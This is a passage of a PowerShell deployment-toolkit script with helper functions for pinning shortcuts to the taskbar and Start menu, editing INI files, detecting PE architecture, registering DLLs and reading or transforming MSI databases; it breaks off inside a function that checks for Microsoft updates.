				If ([int]$envOSVersionMajor -ge 10)	{
					If ((Get-Item -Path $FilePath).Extension -ne '.lnk') {
						Throw "Only shortcut files (.lnk) are supported on Windows 10 and higher."
					}
					ElseIf (-not ($FilePath.StartsWith($envUserStartMenu) -or $FilePath.StartsWith($envCommonStartMenu))) {
						Throw "Only shortcut files (.lnk) in [$envUserStartMenu] and [$envCommonStartMenu] are supported on Windows 10 and higher."
					}
				}

				[string]$PinVerbAction = Get-PinVerb -VerbId $Verbs.$Action
				If (-not ($PinVerbAction)) {
					Throw "Failed to get a localized pin verb for action [$Action]. Action is not supported on this operating system."
				}

				Invoke-Verb -FilePath $FilePath -Verb $PinVerbAction
			}
			ElseIf ($Action.Contains("Taskbar")) {
				If ([int]$envOSVersionMajor -ge 10) {
					$FileNameWithoutExtension = [System.IO.Path]::GetFileNameWithoutExtension($FilePath)
					$PinExists = Test-Path -Path "$envAppData\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\$($FileNameWithoutExtension).lnk"

					If ($Action -eq 'PintoTaskbar' -and $PinExists) {
						If($(Invoke-ObjectMethod -InputObject $Shell -MethodName 'CreateShortcut' -ArgumentList "$envAppData\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\$($FileNameWithoutExtension).lnk").TargetPath -eq $FilePath) {
							Write-Log -Message "Pin [$FileNameWithoutExtension] already exists." -Source ${CmdletName}
							return
						}
					}
					ElseIf ($Action -eq 'UnpinfromTaskbar' -and $PinExists -eq $false) {
						Write-Log -Message "Pin [$FileNameWithoutExtension] does not exist." -Source ${CmdletName}
						return
					}

					$ExplorerCommandHandler = Get-RegistryKey -Key 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\CommandStore\shell\Windows.taskbarpin' -Value 'ExplorerCommandHandler'
					$classesStarKey = (Get-Item "Registry::HKEY_USERS\$($RunasActiveUser.SID)\SOFTWARE\Classes").OpenSubKey("*", $true)
					$shellKey = $classesStarKey.CreateSubKey("shell", $true)
					$specialKey = $shellKey.CreateSubKey("{:}", $true)
					$specialKey.SetValue("ExplorerCommandHandler", $ExplorerCommandHandler)

					$Folder = Invoke-ObjectMethod -InputObject $ShellApp -MethodName 'Namespace' -ArgumentList $(Split-Path -Path $FilePath -Parent)
					$Item = Invoke-ObjectMethod -InputObject $Folder -MethodName 'ParseName' -ArgumentList $(Split-Path -Path $FilePath -Leaf)

					$Item.InvokeVerb("{:}")

					$shellKey.DeleteSubKey("{:}")
					If ($shellKey.SubKeyCount -eq 0 -and $shellKey.ValueCount -eq 0) {
						$classesStarKey.DeleteSubKey("shell")
					}
				}
				Else {
					[string]$PinVerbAction = Get-PinVerb -VerbId $Verbs.$Action
					If (-not ($PinVerbAction)) {
						Throw "Failed to get a localized pin verb for action [$Action]. Action is not supported on this operating system."
					}

					Invoke-Verb -FilePath $FilePath -Verb $PinVerbAction
				}
			}
		}
		Catch {
			Write-Log -Message "Failed to execute action [$Action]. `n$(Resolve-Error)" -Severity 2 -Source ${CmdletName}
		}
		Finally {
			Try { If ($shellKey) { $shellKey.Close() } } Catch { }
			Try { If ($classesStarKey) { $classesStarKey.Close() } } Catch { }
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Get-IniValue {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true)]
		[ValidateNotNullorEmpty()]
		[string]$FilePath,
		[Parameter(Mandatory=$true)]
		[ValidateNotNullorEmpty()]
		[string]$Section,
		[Parameter(Mandatory=$true)]
		[ValidateNotNullorEmpty()]
		[string]$Key,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[boolean]$ContinueOnError = $true
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		Try {
			Write-Log -Message "Read INI Key: [Section = $Section] [Key = $Key]." -Source ${CmdletName}

			If (-not (Test-Path -LiteralPath $FilePath -PathType 'Leaf')) { Throw "File [$filePath] could not be found." }

			$IniValue = [PSADT.IniFile]::GetIniValue($Section, $Key, $FilePath)
			Write-Log -Message "INI Key Value: [Section = $Section] [Key = $Key] [Value = $IniValue]." -Source ${CmdletName}

			Write-Output -InputObject $IniValue
		}
		Catch {
			Write-Log -Message "Failed to read INI file key value. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
			If (-not $ContinueOnError) {
				Throw "Failed to read INI file key value: $($_.Exception.Message)"
			}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Set-IniValue {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true)]
		[ValidateNotNullorEmpty()]
		[string]$FilePath,
		[Parameter(Mandatory=$true)]
		[ValidateNotNullorEmpty()]
		[string]$Section,
		[Parameter(Mandatory=$true)]
		[ValidateNotNullorEmpty()]
		[string]$Key,
		
		[Parameter(Mandatory=$true)]
		[AllowNull()]
		$Value,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[boolean]$ContinueOnError = $true
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		Try {
			Write-Log -Message "Write INI Key Value: [Section = $Section] [Key = $Key] [Value = $Value]." -Source ${CmdletName}

			If (-not (Test-Path -LiteralPath $FilePath -PathType 'Leaf')) { Throw "File [$filePath] could not be found." }

			[PSADT.IniFile]::SetIniValue($Section, $Key, ([Text.StringBuilder]$Value), $FilePath)
		}
		Catch {
			Write-Log -Message "Failed to write INI file key value. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
			If (-not $ContinueOnError) {
				Throw "Failed to write INI file key value: $($_.Exception.Message)"
			}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Get-PEFileArchitecture {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true,ValueFromPipeline=$true,ValueFromPipelineByPropertyName=$true)]
		[ValidateScript({ Test-Path -LiteralPath $_ -PathType 'Leaf' })]
		[IO.FileInfo[]]$FilePath,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[boolean]$ContinueOnError = $true,
		[Parameter(Mandatory=$false)]
		[switch]$PassThru
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header

		[string[]]$PEFileExtensions = '.exe', '.dll', '.ocx', '.drv', '.sys', '.scr', '.efi', '.cpl', '.fon'
		[int32]$MACHINE_OFFSET = 4
		[int32]$PE_POINTER_OFFSET = 60
	}
	Process {
		ForEach ($Path in $filePath) {
			Try {
				If ($PEFileExtensions -notcontains $Path.Extension) {
					Throw "Invalid file type. Please specify one of the following PE file types: $($PEFileExtensions -join ', ')"
				}

				[byte[]]$data = New-Object -TypeName 'System.Byte[]' -ArgumentList 4096
				$stream = New-Object -TypeName 'System.IO.FileStream' -ArgumentList ($Path.FullName, 'Open', 'Read')
				$null = $stream.Read($data, 0, 4096)
				$stream.Flush()
				$stream.Close()

				[int32]$PE_HEADER_ADDR = [BitConverter]::ToInt32($data, $PE_POINTER_OFFSET)
				[uint16]$PE_IMAGE_FILE_HEADER = [BitConverter]::ToUInt16($data, $PE_HEADER_ADDR + $MACHINE_OFFSET)
				Switch ($PE_IMAGE_FILE_HEADER) {
					0 { $PEArchitecture = 'Native' } 
					0x014c { $PEArchitecture = '32BIT' } 
					0x0200 { $PEArchitecture = 'Itanium-x64' } 
					0x8664 { $PEArchitecture = '64BIT' } 
					Default { $PEArchitecture = 'Unknown' }
				}
				Write-Log -Message "File [$($Path.FullName)] has a detected file architecture of [$PEArchitecture]." -Source ${CmdletName}

				If ($PassThru) {
					
					Get-Item -LiteralPath $Path.FullName -Force | Add-Member -MemberType 'NoteProperty' -Name 'BinaryType' -Value $PEArchitecture -Force -PassThru | Write-Output
				}
				Else {
					Write-Output -InputObject $PEArchitecture
				}
			}
			Catch {
				Write-Log -Message "Failed to get the PE file architecture. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
				If (-not $ContinueOnError) {
					Throw "Failed to get the PE file architecture: $($_.Exception.Message)"
				}
				Continue
			}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Invoke-RegisterOrUnregisterDLL {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true)]
		[ValidateNotNullorEmpty()]
		[string]$FilePath,
		[Parameter(Mandatory=$false)]
		[ValidateSet('Register','Unregister')]
		[string]$DLLAction,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[boolean]$ContinueOnError = $true
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header

		
		[string]${InvokedCmdletName} = $MyInvocation.InvocationName
		
		If (${InvokedCmdletName} -ne ${CmdletName}) {
			Switch (${InvokedCmdletName}) {
				'Register-DLL' { [string]$DLLAction = 'Register' }
				'Unregister-DLL' { [string]$DLLAction = 'Unregister' }
			}
		}
		
		If (-not $DLLAction) { Throw 'Parameter validation failed. Please specify the [-DLLAction] parameter to determine whether to register or unregister the DLL.' }
		[string]$DLLAction = ((Get-Culture).TextInfo).ToTitleCase($DLLAction.ToLower())
		Switch ($DLLAction) {
			'Register' { [string]$DLLActionParameters = "/s `"$FilePath`"" }
			'Unregister' { [string]$DLLActionParameters = "/s /u `"$FilePath`"" }
		}
	}
	Process {
		Try {
			Write-Log -Message "$DLLAction DLL file [$filePath]." -Source ${CmdletName}
			If (-not (Test-Path -LiteralPath $FilePath -PathType 'Leaf')) { Throw "File [$filePath] could not be found." }

			[string]$DLLFileBitness = Get-PEFileArchitecture -FilePath $filePath -ContinueOnError $false -ErrorAction 'Stop'
			If (($DLLFileBitness -ne '64BIT') -and ($DLLFileBitness -ne '32BIT')) {
				Throw "File [$filePath] has a detected file architecture of [$DLLFileBitness]. Only 32-bit or 64-bit DLL files can be $($DLLAction.ToLower() + 'ed')."
			}

			If ($Is64Bit) {
				If ($DLLFileBitness -eq '64BIT') {
					If ($Is64BitProcess) {
						[string]$RegSvr32Path = "$envWinDir\system32\regsvr32.exe"
					}
					Else {
						[string]$RegSvr32Path = "$envWinDir\sysnative\regsvr32.exe"
					}
				}
				ElseIf ($DLLFileBitness -eq '32BIT') {
					[string]$RegSvr32Path = "$envWinDir\SysWOW64\regsvr32.exe"
				}
			}
			Else {
				If ($DLLFileBitness -eq '64BIT') {
					Throw "File [$filePath] cannot be $($DLLAction.ToLower()) because it is a 64-bit file on a 32-bit operating system."
				}
				ElseIf ($DLLFileBitness -eq '32BIT') {
					[string]$RegSvr32Path = "$envWinDir\system32\regsvr32.exe"
				}
			}

			[psobject]$ExecuteResult = Execute-Process -Path $RegSvr32Path -Parameters $DLLActionParameters -WindowStyle 'Hidden' -PassThru

			If ($ExecuteResult.ExitCode -ne 0) {
				If ($ExecuteResult.ExitCode -eq 60002) {
					Throw "Execute-Process function failed with exit code [$($ExecuteResult.ExitCode)]."
				}
				Else {
					Throw "regsvr32.exe failed with exit code [$($ExecuteResult.ExitCode)]."
				}
			}
		}
		Catch {
			Write-Log -Message "Failed to $($DLLAction.ToLower()) DLL file. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
			If (-not $ContinueOnError) {
				Throw "Failed to $($DLLAction.ToLower()) DLL file: $($_.Exception.Message)"
			}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}
Set-Alias -Name 'Register-DLL' -Value 'Invoke-RegisterOrUnregisterDLL' -Scope 'Script' -Force -ErrorAction 'SilentlyContinue'
Set-Alias -Name 'Unregister-DLL' -Value 'Invoke-RegisterOrUnregisterDLL' -Scope 'Script' -Force -ErrorAction 'SilentlyContinue'




Function Invoke-ObjectMethod {

	[CmdletBinding(DefaultParameterSetName='Positional')]
	Param (
		[Parameter(Mandatory=$true,Position=0)]
		[ValidateNotNull()]
		[object]$InputObject,
		[Parameter(Mandatory=$true,Position=1)]
		[ValidateNotNullorEmpty()]
		[string]$MethodName,
		[Parameter(Mandatory=$false,Position=2,ParameterSetName='Positional')]
		[object[]]$ArgumentList,
		[Parameter(Mandatory=$true,Position=2,ParameterSetName='Named')]
		[ValidateNotNull()]
		[hashtable]$Parameter
	)

	Begin { }
	Process {
		If ($PSCmdlet.ParameterSetName -eq 'Named') {
			
			Write-Output -InputObject $InputObject.GetType().InvokeMember($MethodName, [Reflection.BindingFlags]::InvokeMethod, $null, $InputObject, ([object[]]($Parameter.Values)), $null, $null, ([string[]]($Parameter.Keys)))
		}
		Else {
			
			Write-Output -InputObject $InputObject.GetType().InvokeMember($MethodName, [Reflection.BindingFlags]::InvokeMethod, $null, $InputObject, $ArgumentList, $null, $null, $null)
		}
	}
	End { }
}




Function Get-ObjectProperty {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true,Position=0)]
		[ValidateNotNull()]
		[object]$InputObject,
		[Parameter(Mandatory=$true,Position=1)]
		[ValidateNotNullorEmpty()]
		[string]$PropertyName,
		[Parameter(Mandatory=$false,Position=2)]
		[object[]]$ArgumentList
	)

	Begin { }
	Process {
		
		Write-Output -InputObject $InputObject.GetType().InvokeMember($PropertyName, [Reflection.BindingFlags]::GetProperty, $null, $InputObject, $ArgumentList, $null, $null, $null)
	}
	End { }
}




Function Get-MsiTableProperty {

	[CmdletBinding(DefaultParameterSetName='TableInfo')]
	Param (
		[Parameter(Mandatory=$true)]
		[ValidateScript({ Test-Path -LiteralPath $_ -PathType 'Leaf' })]
		[string]$Path,
		[Parameter(Mandatory=$false)]
		[ValidateScript({ Test-Path -LiteralPath $_ -PathType 'Leaf' })]
		[string[]]$TransformPath,
		[Parameter(Mandatory=$false,ParameterSetName='TableInfo')]
		[ValidateNotNullOrEmpty()]
		[string]$Table = $(If ([IO.Path]::GetExtension($Path) -eq '.msi') { 'Property' } Else { 'MsiPatchMetadata' }),
		[Parameter(Mandatory=$false,ParameterSetName='TableInfo')]
		[ValidateNotNullorEmpty()]
		[int32]$TablePropertyNameColumnNum = $(If ([IO.Path]::GetExtension($Path) -eq '.msi') { 1 } Else { 2 }),
		[Parameter(Mandatory=$false,ParameterSetName='TableInfo')]
		[ValidateNotNullorEmpty()]
		[int32]$TablePropertyValueColumnNum = $(If ([IO.Path]::GetExtension($Path) -eq '.msi') { 2 } Else { 3 }),
		[Parameter(Mandatory=$true,ParameterSetName='SummaryInfo')]
		[ValidateNotNullorEmpty()]
		[switch]$GetSummaryInformation = $false,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[boolean]$ContinueOnError = $true
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name

		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		Try {
			If ($PSCmdlet.ParameterSetName -eq 'TableInfo') {
				Write-Log -Message "Read data from Windows Installer database file [$Path] in table [$Table]." -Source ${CmdletName}
			}
			Else {
				Write-Log -Message "Read the Summary Information from the Windows Installer database file [$Path]." -Source ${CmdletName}
			}

			
			[__comobject]$Installer = New-Object -ComObject 'WindowsInstaller.Installer' -ErrorAction 'Stop'
			
			If ([IO.Path]::GetExtension($Path) -eq '.msp') { [boolean]$IsMspFile = $true }
			
			[int32]$msiOpenDatabaseModeReadOnly = 0
			[int32]$msiSuppressApplyTransformErrors = 63
			[int32]$msiOpenDatabaseMode = $msiOpenDatabaseModeReadOnly
			[int32]$msiOpenDatabaseModePatchFile = 32
			If ($IsMspFile) { [int32]$msiOpenDatabaseMode = $msiOpenDatabaseModePatchFile }
			
			[__comobject]$Database = Invoke-ObjectMethod -InputObject $Installer -MethodName 'OpenDatabase' -ArgumentList @($Path, $msiOpenDatabaseMode)
			
			If (($TransformPath) -and (-not $IsMspFile)) {
				ForEach ($Transform in $TransformPath) {
					$null = Invoke-ObjectMethod -InputObject $Database -MethodName 'ApplyTransform' -ArgumentList @($Transform, $msiSuppressApplyTransformErrors)
				}
			}

			
			If ($PSCmdlet.ParameterSetName -eq 'TableInfo') {
				
				[__comobject]$View = Invoke-ObjectMethod -InputObject $Database -MethodName 'OpenView' -ArgumentList @("SELECT * FROM $Table")
				$null = Invoke-ObjectMethod -InputObject $View -MethodName 'Execute'

				
				[psobject]$TableProperties = New-Object -TypeName 'PSObject'

				
				
				[__comobject]$Record = Invoke-ObjectMethod -InputObject $View -MethodName 'Fetch'
				While ($Record) {
					
					$TableProperties | Add-Member -MemberType 'NoteProperty' -Name (Get-ObjectProperty -InputObject $Record -PropertyName 'StringData' -ArgumentList @($TablePropertyNameColumnNum)) -Value (Get-ObjectProperty -InputObject $Record -PropertyName 'StringData' -ArgumentList @($TablePropertyValueColumnNum)) -Force
					
					[__comobject]$Record = Invoke-ObjectMethod -InputObject $View -MethodName 'Fetch'
				}
				Write-Output -InputObject $TableProperties
			}
			Else {
				
				[__comobject]$SummaryInformation = Get-ObjectProperty -InputObject $Database -PropertyName 'SummaryInformation'
				[hashtable]$SummaryInfoProperty = @{}
				
				$SummaryInfoProperty.Add('CodePage', (Get-ObjectProperty -InputObject $SummaryInformation -PropertyName 'Property' -ArgumentList @(1)))
				$SummaryInfoProperty.Add('Title', (Get-ObjectProperty -InputObject $SummaryInformation -PropertyName 'Property' -ArgumentList @(2)))
				$SummaryInfoProperty.Add('Subject', (Get-ObjectProperty -InputObject $SummaryInformation -PropertyName 'Property' -ArgumentList @(3)))
				$SummaryInfoProperty.Add('Author', (Get-ObjectProperty -InputObject $SummaryInformation -PropertyName 'Property' -ArgumentList @(4)))
				$SummaryInfoProperty.Add('Keywords', (Get-ObjectProperty -InputObject $SummaryInformation -PropertyName 'Property' -ArgumentList @(5)))
				$SummaryInfoProperty.Add('Comments', (Get-ObjectProperty -InputObject $SummaryInformation -PropertyName 'Property' -ArgumentList @(6)))
				$SummaryInfoProperty.Add('Template', (Get-ObjectProperty -InputObject $SummaryInformation -PropertyName 'Property' -ArgumentList @(7)))
				$SummaryInfoProperty.Add('LastSavedBy', (Get-ObjectProperty -InputObject $SummaryInformation -PropertyName 'Property' -ArgumentList @(8)))
				$SummaryInfoProperty.Add('RevisionNumber', (Get-ObjectProperty -InputObject $SummaryInformation -PropertyName 'Property' -ArgumentList @(9)))
				$SummaryInfoProperty.Add('LastPrinted', (Get-ObjectProperty -InputObject $SummaryInformation -PropertyName 'Property' -ArgumentList @(11)))
				$SummaryInfoProperty.Add('CreateTimeDate', (Get-ObjectProperty -InputObject $SummaryInformation -PropertyName 'Property' -ArgumentList @(12)))
				$SummaryInfoProperty.Add('LastSaveTimeDate', (Get-ObjectProperty -InputObject $SummaryInformation -PropertyName 'Property' -ArgumentList @(13)))
				$SummaryInfoProperty.Add('PageCount', (Get-ObjectProperty -InputObject $SummaryInformation -PropertyName 'Property' -ArgumentList @(14)))
				$SummaryInfoProperty.Add('WordCount', (Get-ObjectProperty -InputObject $SummaryInformation -PropertyName 'Property' -ArgumentList @(15)))
				$SummaryInfoProperty.Add('CharacterCount', (Get-ObjectProperty -InputObject $SummaryInformation -PropertyName 'Property' -ArgumentList @(16)))
				$SummaryInfoProperty.Add('CreatingApplication', (Get-ObjectProperty -InputObject $SummaryInformation -PropertyName 'Property' -ArgumentList @(18)))
				$SummaryInfoProperty.Add('Security', (Get-ObjectProperty -InputObject $SummaryInformation -PropertyName 'Property' -ArgumentList @(19)))
				[psobject]$SummaryInfoProperties = New-Object -TypeName 'PSObject' -Property $SummaryInfoProperty
				Write-Output -InputObject $SummaryInfoProperties
			}
		}
		Catch {
			Write-Log -Message "Failed to get the MSI table [$Table]. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
			If (-not $ContinueOnError) {
				Throw "Failed to get the MSI table [$Table]: $($_.Exception.Message)"
			}
		}
		Finally {
			Try {
				If ($View) {
					$null = Invoke-ObjectMethod -InputObject $View -MethodName 'Close' -ArgumentList @()
					Try { $null = [Runtime.Interopservices.Marshal]::ReleaseComObject($View) } Catch { }
				}
				ElseIf($SummaryInformation) {
					Try { $null = [Runtime.Interopservices.Marshal]::ReleaseComObject($SummaryInformation) } Catch { }
				}
			}
			Catch { }
			Try { $null = [Runtime.Interopservices.Marshal]::ReleaseComObject($DataBase) } Catch { }
			Try { $null = [Runtime.Interopservices.Marshal]::ReleaseComObject($Installer) } Catch { }
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Set-MsiProperty {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true)]
		[ValidateNotNullorEmpty()]
		[__comobject]$DataBase,
		[Parameter(Mandatory=$true)]
		[ValidateNotNullorEmpty()]
		[string]$PropertyName,
		[Parameter(Mandatory=$true)]
		[ValidateNotNullorEmpty()]
		[string]$PropertyValue,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[boolean]$ContinueOnError = $true
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name

		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		Try {
			Write-Log -Message "Set the MSI Property Name [$PropertyName] with Property Value [$PropertyValue]." -Source ${CmdletName}

			
			[__comobject]$View = Invoke-ObjectMethod -InputObject $DataBase -MethodName 'OpenView' -ArgumentList @("SELECT * FROM Property WHERE Property='$PropertyName'")
			$null = Invoke-ObjectMethod -InputObject $View -MethodName 'Execute'

			
			
			[__comobject]$Record = Invoke-ObjectMethod -InputObject $View -MethodName 'Fetch'

			
			$null = Invoke-ObjectMethod -InputObject $View -MethodName 'Close' -ArgumentList @()
			$null = [Runtime.Interopservices.Marshal]::ReleaseComObject($View)

			
			If ($Record) {
				
				[__comobject]$View = Invoke-ObjectMethod -InputObject $DataBase -MethodName 'OpenView' -ArgumentList @("UPDATE Property SET Value='$PropertyValue' WHERE Property='$PropertyName'")
			}
			Else {
				
				[__comobject]$View = Invoke-ObjectMethod -InputObject $DataBase -MethodName 'OpenView' -ArgumentList @("INSERT INTO Property (Property, Value) VALUES ('$PropertyName','$PropertyValue')")
			}
			
			$null = Invoke-ObjectMethod -InputObject $View -MethodName 'Execute'
		}
		Catch {
			Write-Log -Message "Failed to set the MSI Property Name [$PropertyName] with Property Value [$PropertyValue]. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
			If (-not $ContinueOnError) {
				Throw "Failed to set the MSI Property Name [$PropertyName] with Property Value [$PropertyValue]: $($_.Exception.Message)"
			}
		}
		Finally {
			Try {
				If ($View) {
					$null = Invoke-ObjectMethod -InputObject $View -MethodName 'Close' -ArgumentList @()
					$null = [Runtime.Interopservices.Marshal]::ReleaseComObject($View)
				}
			}
			Catch { }
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function New-MsiTransform {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true)]
		[ValidateScript({ Test-Path -LiteralPath $_ -PathType 'Leaf' })]
		[string]$MsiPath,
		[Parameter(Mandatory=$false)]
		[ValidateScript({ Test-Path -LiteralPath $_ -PathType 'Leaf' })]
		[string]$ApplyTransformPath,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[string]$NewTransformPath,
		[Parameter(Mandatory=$true)]
		[ValidateNotNullorEmpty()]
		[hashtable]$TransformProperties,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[boolean]$ContinueOnError = $true
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name

		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header

		
		[int32]$msiOpenDatabaseModeReadOnly = 0
		[int32]$msiOpenDatabaseModeTransact = 1
		[int32]$msiViewModifyUpdate = 2
		[int32]$msiViewModifyReplace = 4
		[int32]$msiViewModifyDelete = 6
		[int32]$msiTransformErrorNone = 0
		[int32]$msiTransformValidationNone = 0
		[int32]$msiSuppressApplyTransformErrors = 63
	}
	Process {
		Try {
			Write-Log -Message "Create a transform file for MSI [$MsiPath]." -Source ${CmdletName}

			
			[string]$MsiParentFolder = Split-Path -Path $MsiPath -Parent -ErrorAction 'Stop'

			
			[string]$TempMsiPath = Join-Path -Path $MsiParentFolder -ChildPath ([IO.Path]::GetFileName(([IO.Path]::GetTempFileName()))) -ErrorAction 'Stop'

			
			Write-Log -Message "Copy MSI database in path [$MsiPath] to destination [$TempMsiPath]." -Source ${CmdletName}
			$null = Copy-Item -LiteralPath $MsiPath -Destination $TempMsiPath -Force -ErrorAction 'Stop'

			
			[__comobject]$Installer = New-Object -ComObject 'WindowsInstaller.Installer' -ErrorAction 'Stop'

			
			
			Write-Log -Message "Open the MSI database [$MsiPath] in read only mode." -Source ${CmdletName}
			[__comobject]$MsiPathDatabase = Invoke-ObjectMethod -InputObject $Installer -MethodName 'OpenDatabase' -ArgumentList @($MsiPath, $msiOpenDatabaseModeReadOnly)
			
			Write-Log -Message "Open the MSI database [$TempMsiPath] in view/modify/update mode." -Source ${CmdletName}
			[__comobject]$TempMsiPathDatabase = Invoke-ObjectMethod -InputObject $Installer -MethodName 'OpenDatabase' -ArgumentList @($TempMsiPath, $msiViewModifyUpdate)

			
			If ($ApplyTransformPath) {
				Write-Log -Message "Apply transform file [$ApplyTransformPath] to MSI database [$TempMsiPath]." -Source ${CmdletName}
				$null = Invoke-ObjectMethod -InputObject $TempMsiPathDatabase -MethodName 'ApplyTransform' -ArgumentList @($ApplyTransformPath, $msiSuppressApplyTransformErrors)
			}

			
			If (-not $NewTransformPath) {
				If ($ApplyTransformPath) {
					[string]$NewTransformFileName = [IO.Path]::GetFileNameWithoutExtension($ApplyTransformPath) + '.new' + [IO.Path]::GetExtension($ApplyTransformPath)
				}
				Else {
					[string]$NewTransformFileName = [IO.Path]::GetFileNameWithoutExtension($MsiPath) + '.mst'
				}
				[string]$NewTransformPath = Join-Path -Path $MsiParentFolder -ChildPath $NewTransformFileName -ErrorAction 'Stop'
			}

			
			$TransformProperties.GetEnumerator() | ForEach-Object { Set-MsiProperty -DataBase $TempMsiPathDatabase -PropertyName $_.Key -PropertyValue $_.Value }

			
			$null = Invoke-ObjectMethod -InputObject $TempMsiPathDatabase -MethodName 'Commit'

			
			
			$null = [Runtime.Interopservices.Marshal]::ReleaseComObject($TempMsiPathDatabase)
			
			Write-Log -Message "Re-open the MSI database [$TempMsiPath] in read only mode." -Source ${CmdletName}
			[__comobject]$TempMsiPathDatabase = Invoke-ObjectMethod -InputObject $Installer -MethodName 'OpenDatabase' -ArgumentList @($TempMsiPath, $msiOpenDatabaseModeReadOnly)

			
			If (Test-Path -LiteralPath $NewTransformPath -PathType 'Leaf' -ErrorAction 'Stop') {
				Write-Log -Message "A transform file of the same name already exists. Deleting transform file [$NewTransformPath]." -Source ${CmdletName}
				$null = Remove-Item -LiteralPath $NewTransformPath -Force -ErrorAction 'Stop'
			}

			
			Write-Log -Message "Generate new transform file [$NewTransformPath]." -Source ${CmdletName}
			$null = Invoke-ObjectMethod -InputObject $TempMsiPathDatabase -MethodName 'GenerateTransform' -ArgumentList @($MsiPathDatabase, $NewTransformPath)
			$null = Invoke-ObjectMethod -InputObject $TempMsiPathDatabase -MethodName 'CreateTransformSummaryInfo' -ArgumentList @($MsiPathDatabase, $NewTransformPath, $msiTransformErrorNone, $msiTransformValidationNone)

			If (Test-Path -LiteralPath $NewTransformPath -PathType 'Leaf' -ErrorAction 'Stop') {
				Write-Log -Message "Successfully created new transform file in path [$NewTransformPath]." -Source ${CmdletName}
			}
			Else {
				Throw "Failed to generate transform file in path [$NewTransformPath]."
			}
		}
		Catch {
			Write-Log -Message "Failed to create new transform file in path [$NewTransformPath]. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
			If (-not $ContinueOnError) {
				Throw "Failed to create new transform file in path [$NewTransformPath]: $($_.Exception.Message)"
			}
		}
		Finally {
			Try { $null = [Runtime.Interopservices.Marshal]::ReleaseComObject($TempMsiPathDatabase) } Catch { }
			Try { $null = [Runtime.Interopservices.Marshal]::ReleaseComObject($MsiPathDatabase) } Catch { }
			Try { $null = [Runtime.Interopservices.Marshal]::ReleaseComObject($Installer) } Catch { }
			Try {
				
				If (Test-Path -LiteralPath $TempMsiPath -PathType 'Leaf' -ErrorAction 'Stop') {
					$null = Remove-Item -LiteralPath $TempMsiPath -Force -ErrorAction 'Stop'
				}
			}
			Catch { }
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Test-MSUpdates {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true,Position=0,HelpMessage='Enter the KB Number for the Microsoft Update')]
		[ValidateNotNullorEmpty()]
		[string]$KBNumber,
		[Parameter(Mandatory=$false,Position=1)]
		[ValidateNotNullorEmpty()]
		[boolean]$ContinueOnError = $true
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		Try {
